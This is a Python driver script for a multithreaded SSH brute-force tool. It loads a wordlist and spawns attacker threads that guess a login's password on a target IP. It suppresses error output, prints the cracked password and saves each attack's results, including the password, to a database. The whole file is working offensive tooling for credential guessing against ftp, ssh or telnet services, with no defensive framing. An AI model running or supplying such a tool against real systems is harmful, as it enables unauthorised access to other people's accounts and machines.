import sys
from argparser import argparse
from sshattack import SSHTarget, SSHAttacker
from dbGUI import Attack, init_database, start_GUI
from datetime import datetime

if __name__ == '__main__':

    portmap = {"ftp": 21, "ssh": 22, "telnet": 23}
    (options, ip_addr, service) = argparse(sys.argv, portmap)

    if options.history is True:
        session = init_database()
        start_GUI(session)
        sys.exit(0)

    target = SSHTarget(
        ip_addr,
        portmap[service],
        options.login,
        options.wordlist,
    )

    f = open('/dev/null', 'w')
    sys.stderr = f

    attackers = []
    for i in range(0, options.threads):
        attacker = SSHAttacker(target)
        attackers.append(attacker)
    for attacker in attackers:
        attacker.start()

    try:
        with open(target.wordlist) as passwords:
            while SSHAttacker.finish is False:
                if target.queue_empty():
                    # fill the queue if it is empty and check for EOF
                    if target.queue_fill(passwords) is False:
                        break
            # wait for other threads to try all passwords
            while not target.queue_empty() and SSHAttacker.finish is False:
                pass
    except (SystemExit, KeyboardInterrupt):
        print("KeyboardInterrupt received, quitting...")
    finally:
        SSHAttacker.finish = True
        for attacker in attackers:
            attacker.join()

    print("\n-=-=-=-=-=  STATISTICS =-=-=-=-=-=-")
    print("Successful: %s" % ("YES" if SSHAttacker.success else "NO"))
    print("IP addr: %s" % (ip_addr))
    print("Service: %s" % (service))
    print("Port: %d" % (target.port))
    print("Username: %s" % (target.login))
    print("Password: %s" % ("?" if not SSHAttacker.success else SSHAttacker.password))
    print("Total attempts: %d" % (sum(attacker.tries for attacker in attackers)))
    print("-=-=-=-=-=-=-=-=-=-=-=-=--==-=-=-=-")

    if options.nostore is False:
        attack = Attack(
            end_time=datetime.now(),
            successful=SSHAttacker.success,
            ip=ip_addr,
            service=service,
            port=target.port,
            login=target.login,
            password=(None if not SSHAttacker.success else SSHAttacker.password),
            total_tries=sum(attacker.tries for attacker in attackers)
        )
        session = init_database()
        session.add(attack)
        session.commit()
